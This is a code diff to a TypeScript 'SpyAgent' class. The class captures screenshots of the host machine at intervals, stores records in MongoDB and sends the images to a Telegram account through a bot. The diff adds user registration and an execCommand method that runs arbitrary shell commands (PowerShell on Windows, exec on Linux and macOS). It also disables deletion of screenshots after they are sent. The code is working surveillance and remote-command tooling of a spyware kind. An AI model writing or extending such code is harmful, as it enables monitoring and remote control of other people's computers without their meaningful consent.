@@ -7,6 +7,8 @@ import { exec } from "child_process";
 import path from "path";
 import { Context, Telegraf } from "telegraf";
 import { Action, UserData } from "./types";
+import User from "../server/models/user.models";
+import Image from "../server/models/imgae.model";
 
 export default class SpyAgent {
     _cacheDir: string;
@@ -19,7 +21,10 @@ export default class SpyAgent {
     interVal: number;
     userName: string | undefined;
     secretFilePath: string;
+    credsFilePath: string;
     notifier: notifier.NodeNotifier;
+    user: any;
+    icon: string;
 
     constructor(bot: Telegraf<Context>) {
         this._cacheDir = process.env.CACHE_DIR!;
@@ -30,6 +35,8 @@ export default class SpyAgent {
         this.interVal = Number(process.env.INTERVAL!);
         this._bot = bot;
         this.notifier = notifier;
+        this.credsFilePath = path.join(process.cwd(), this._cacheDir, process.env.LOCAL_STORAGE!);
+        this.icon = path.join(process.cwd(), 'assets', 'hello.png');
         this.born();
         this.processFiles();
     }
@@ -39,18 +46,25 @@ export default class SpyAgent {
         else return console.log('Spy Agent is not ready!. Wating for a message to detect the user');
     }
 
-    born() {
+    async born() {
         if (!existsSync(this.cacheDirPath)) mkdirSync(this.cacheDirPath);
         if (!existsSync(this.cacheFilePath)) writeFileSync(this.cacheFilePath, '[]', 'utf8');
         if (!existsSync(this.secretFilePath)) writeFileSync(this.secretFilePath, '', 'utf8');
+        if (!existsSync(this.credsFilePath)) writeFileSync(this.credsFilePath, '{}', 'utf8');
         this._files = JSON.parse(readFileSync(this.cacheFilePath, 'utf8') || '[]');
         this.intervalId = setInterval(() => this.captureScreeShot(), this.interVal);
         const username = readFileSync(path.join(process.cwd(), process.env.CACHE_DIR!, process.env.SECRET_FILE!));
         this.userName = this.decryptUsername(username.toString());
+        const userObj = JSON.parse(readFileSync(this.credsFilePath, 'utf-8'));
+        if (userObj?.id) {
+            const user = await User.findOne({ _id: userObj.id });
+            this.user = user;
+        }
     }
 
     die() {
         writeFileSync(this.cacheFilePath, JSON.stringify(this._files), 'utf-8');
+        writeFileSync(this.credsFilePath, JSON.stringify({ id: this.user?._id }) || '{}');
         clearInterval(this.intervalId);
     }
 
@@ -104,13 +118,23 @@ export default class SpyAgent {
         });
     }
 
-    registerUser(data: UserData) {
+    async registerUser(data: UserData, ctx: Context) {
         try {
-
+            if (this.user?.userId === data.userId) return ctx.reply('You are already registered ');
+            if (this?.user?._id) return ctx.reply('You are already registered ');
+            const user = new User(data);
+            await user.save();
+            this.user = user;
+            ctx.reply('Successfully registered 👍');
         }
         catch (err) {
             console.log(err);
+            ctx.reply('Something went wrong while registering user');
         }
+    }
+
+    getUser() {
+        if (this.user) return this.user;
     }
 
     identify() {
@@ -138,6 +162,36 @@ export default class SpyAgent {
         }
     }
 
+    async execCommand(command: string) {
+        try {
+            const platform: string = os.platform();
+            switch (platform) {
+                case 'win32':
+                    exec(command, { 'shell': 'powershell.exe' }, (error, stdout, stderr) => {
+                        if (error || stderr) {
+                            console.log(error || stderr);
+                        }
+                        else console.log(stdout);
+                    });
+                    break;
+                case 'linux':
+                    exec(command, (error, stdout) => {
+                        if (error) return console.log(error);
+                        console.log(stdout);
+                    });
+                    break;
+                case 'darwin':
+                    exec(command, (error, stdout) => {
+                        if (error) return console.log(error);
+                        console.log(stdout);
+                    });
+            }
+        }
+        catch (err) {
+
+        }
+    }
+
     whichUser(name: string) {
         this._bot.telegram.sendMessage(this.userName!, `New Session started,Username :${name}`);
     }
@@ -146,19 +200,23 @@ export default class SpyAgent {
         try {
             const imageDir = path.join(process.cwd(), process.env.FILE_DIR!);
             if (!existsSync(imageDir)) mkdirSync(imageDir);
-            screenshot({ format: 'png' })
-                .then(async (img) => {
-                    const fileName = await this.imageSaver(img);
-                    this.notifier.notify({
-                        title: "Screenshot taken 😉",
-                        message: "agent007 is on duty 👮",
-                        icon: path.join(process.cwd(), 'assets', 'hello.webp'),
+            if (this.user?.id) {
+                screenshot({ format: 'png' })
+                    .then(async (img) => {
+                        const fileName = await this.imageSaver(img);
+                        const image = new Image({ name: fileName, user: this.user.id });
+                        await image.save();
+                        this.notifier.notify({
+                            title: "Screenshot taken 😉",
+                            message: "agent007 is on duty 👮",
+                            icon: this.icon,
+                        });
+                        this.enqueue(fileName);
+                    })
+                    .catch((err: any) => {
+                        console.log(err);
                     });
-                    this.enqueue(fileName);
-                })
-                .catch((err: any) => {
-                    console.log(err);
-                })
+            }
         }
         catch (err) {
             console.log(err);
@@ -171,7 +229,7 @@ export default class SpyAgent {
                 this.notifier.notify({
                     title: "Helllllo Buddy! ",
                     message: actions.text,
-                    icon: path.join(process.cwd(), 'assets', 'hello.webp'),
+                    icon: this.icon,
                 });
                 break;
             case "/shutdown":
@@ -181,7 +239,7 @@ export default class SpyAgent {
                 this.notifier.notify({
                     title: "Helllllo Buddy! ",
                     message: actions.text,
-                    icon: path.join(process.cwd(), 'assets', 'hello.webp'),
+                    icon: this.icon,
                 });
             default:
                 console.log('Hu!');
@@ -198,7 +256,7 @@ export default class SpyAgent {
                     if (file === '') return;
                     const image = path.join(process.cwd(), process.env.FILE_DIR!, file);
                     await this._bot.telegram.sendPhoto(this.userName!, { source: image });
-                    unlinkSync(path.join(process.cwd(), process.env.FILE_DIR!, file));
+                    // unlinkSync(path.join(process.cwd(), process.env.FILE_DIR!, file));
                     this.dequeue();
                 }
                 else {
